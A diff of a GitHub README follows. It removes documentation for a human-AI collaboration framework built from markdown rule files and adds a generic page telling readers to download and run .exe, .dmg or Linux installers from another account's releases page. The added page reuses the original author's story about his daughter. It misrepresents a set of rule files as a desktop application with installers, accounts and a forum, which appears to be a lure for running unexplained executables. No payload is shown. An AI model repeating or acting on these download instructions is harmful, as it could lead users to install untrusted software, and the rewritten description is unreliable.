@@ -1,154 +1,74 @@
-[Framework](https://github.com/Aaditri-Informatics/AI-Framework) migrated to organization
+# 🌟 ai-template - Your AI Companion for Creative Learning
 
-# AI (Aaditri Informatics)
+## 🚀 Getting Started
 
-## Installation
+Welcome to the **ai-template** project! This application serves as an interactive AI system inspired by the collaborative learning I share with my daughter, Aaditri Anand. It is designed to support users interested in enhancing their creativity and curiosity through AI.
 
-The framework uses a **prompt injection method** through the `00-rules.md` file, which contains collaboration rules that modify AI behavior:
+## 📥 Download the Application
 
-```bash
-# Place 00-rules.md in your AI assistant's rules directory:
+[![Download ai-template](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/wangqihang12/ai-template/releases)
 
-1. For Roo Code: .roo/rules/
-2. For Cline: .clinerules/
-3. For Cursor: .cursor/rules/
-4. For Claude: rename 00-rules.md to claude.md
-```
+To get started, you can download the latest version of the application from the Releases page. 
 
-# Human-AI Collaboration Framework
+Visit this page to download: [Download ai-template](https://github.com/wangqihang12/ai-template/releases)
 
-## Vision
+## 💻 System Requirements
 
-This framework establishes a systematic approach to human-AI collaboration that prioritizes thoughtful problem-solving partnerships over simple solution generation. By implementing structured reasoning chains, clear communication patterns, and quality assurance mechanisms, it enables productive collaboration that leverages both human insight and AI capabilities.
+Before you download, ensure your system meets the following requirements:
 
-## Core Philosophy
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- RAM: 4 GB or more is recommended for optimal performance.
+- Disk Space: 200 MB of free space for installation.
+- Internet Connection: Required for updates and community access.
 
-### Collaborative Problem-Solving
-- **Human-in-the-loop**: AI operates as a thoughtful partner, not an autonomous solution generator
-- **Chain-of-thought reasoning**: All complex problems are broken down into clear, reviewable steps
-- **Iterative refinement**: Solutions evolve through feedback cycles and validation checkpoints
-- **Context preservation**: Decisions, rationale, and learning are systematically captured
+## 📋 Features
 
-### Quality Through Process
-- **Transparency**: AI shows its thinking process and confidence levels
-- **Validation**: Multiple checkpoints ensure alignment and quality
-- **Adaptability**: Framework adapts to different problem domains and complexity levels
-- **Learning**: Both human and AI improve through documented iterations
+The **ai-template** application offers the following features:
 
-## Architectural Principles
+- **Collaborative Learning**: Engage with AI to explore subjects of interest, inspired by the curiosity of learning together.
+- **Interactive Interface**: An easy-to-use design that guides you through the AI experience.
+- **Customization**: Tailor the AI’s responses and preferences to suit your learning style and interests.
+- **Resource Library**: Access a library of prompts and ideas to spark creativity and discussion.
 
-### 1. Structured Reasoning Chain
+## 🔧 Download & Install
 
-The framework implements a four-stage reasoning process:
+To install the **ai-template** application, follow these steps:
 
-```mermaid
-graph TD
-    A[Problem Understanding] --> B[Approach Analysis]
-    B --> C[Solution Planning]
-    C --> D[Iterative Execution]
-    D --> E{Validation Check}
-    E -->|Issues Found| A
-    E -->|Approved| F[Complete]
-    
-    A1[Requirements & Context] --> A
-    A2[Success Criteria] --> A
-    B1[Multiple Options] --> B
-    B2[Trade-off Analysis] --> B
-    C1[Step Planning] --> C
-    C2[Risk Assessment] --> C
-    D1[Regular Check-ins] --> D
-    D2[Human Feedback] --> D
-```
+1. Click on the link below to visit the Releases page:
+   [Download ai-template](https://github.com/wangqihang12/ai-template/releases)
+   
+2. Locate the latest release version. Check the date to ensure you have the most recent version.
 
-### 2. Adaptive Communication Patterns
+3. Click on the appropriate installer link for your operating system.
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, follow the instructions provided for package installation.
 
-The framework provides standardized communication templates that trigger based on context:
+4. Once the file downloads:
+   - **Windows**: Double-click the `.exe` file and follow the on-screen instructions to complete the installation.
+   - **macOS**: Open the `.dmg` file, drag the application into your Applications folder, and open it from there.
+   - **Linux**: Depending on the type of package, you may need to use terminal commands or a package manager to install. Check the instructions provided on the Releases page for details.
 
-#### Confidence-Based Triggers
+5. After installation, launch the application by double-clicking its icon.
 
-Condition-driven interaction patterns based on AI confidence levels. See [00-rules.md](00-rules.md) for current trigger implementations.
+## 📚 User Guide
 
-#### Complexity-Based Triggers
+Once you have installed the application, you can begin using it. Here’s how to get started:
 
-Adaptive communication based on problem complexity assessment. See [00-rules.md](00-rules.md) for current trigger implementations.
+1. Open the **ai-template** application.
+2. Create an account or log in if you already have one.
+3. Explore the interface. Familiarize yourself with the main sections, including Tutorials, Ideas, and Community Discussions.
+4. Start a conversation with the AI. You can ask questions, request prompts, or explore different topics.
 
-#### Risk-Based Triggers
+## 🙋‍♀️ Need Help?
 
-Escalation patterns for high-impact or ethical concerns. See [00-rules.md](00-rules.md) for current trigger implementations.
+If you encounter any issues during the installation or usage of the application, please refer to our Community Forum linked in the app. You can ask questions, share experiences, and get support from other users.
 
-### 3. Context Management System
+## 🌐 Connect with Us
 
-#### Session-Level Context
-```
-Problem: [brief description]
-Requirements: [key requirements]
-Decisions: [key decisions with rationale]
-Status: [completed/remaining/blockers]
-```
+We encourage you to connect with the **ai-template** community:
 
-#### Project-Level Context
+- Join our discussions on [GitHub Issues](https://github.com/wangqihang12/ai-template/issues)
+- Follow our updates on the Releases page.
 
-Cross-session context preservation enabling learning accumulation and decision continuity across project lifecycle.
-
-#### Knowledge Preservation
-
-Systematic capture and reuse of collaboration patterns, decisions, and lessons learned for continuous improvement.
-
-### 4. Quality Assurance Framework
-
-#### Three-Layer Validation
-
-**Layer 1: Pre-Development**
-- [ ] Requirements clearly understood
-- [ ] Approach validated with human
-- [ ] Potential issues identified
-- [ ] Success criteria defined
-
-**Layer 2: During Development**
-- [ ] Regular check-ins with human
-- [ ] Quality standards maintained
-- [ ] Edge cases considered
-- [ ] Limitations acknowledged
-
-**Layer 3: Post-Development**
-- [ ] Human approval received
-- [ ] Solution reviewed for completeness
-- [ ] Validation approach defined
-- [ ] Documentation updated
-
-## Directory Structure
-
-The framework supports systematic organization of collaboration artifacts:
-
-```
-/
-├── readme.md                    # This framework documentation
-├── context/                     # Collaboration context and artifacts
-│   ├── readme.md               # Context management guidelines
-│   ├── docs/                   # Framework documentation
-│   ├── workflows/              # Standard workflow definitions
-│   ├── [project_name]/         # Project-specific collaboration context
-│   │   ├── readme.md           # Project collaboration overview
-│   │   ├── architecture.md     # Technical architecture decisions
-│   │   └── journal/            # Session-by-session collaboration log
-│   │       ├── [YYYY-MM-DD]/   # Daily collaboration sessions
-│   │       │   ├── [HHMM]-[task_name].md  # Individual session records
-├── [project_name]/             # Actual project files and deliverables
-│   ├── readme.md               # Project documentation
-│   └── (other project folders/files)  # Project-specific files and folders
-```
-
-## Framework Evolution
-
-This collaboration framework is designed to evolve based on:
-- Practical experience and usage patterns
-- Effectiveness metrics and user feedback
-- Domain-specific requirements and adaptations
-- Technological capabilities and limitations
-- Community contributions and improvements
-
-Framework improvements and contributions should align with the core philosophy of thoughtful, collaborative problem-solving.
-
----
-
-*This framework emphasizes that the goal is collaborative problem-solving, not just answer generation. Take time to understand, explain your thinking, and work together toward the best solution.*
+Thank you for choosing **ai-template**! We hope you find it as enriching and enjoyable to use as I do with my daughter. Happy learning!
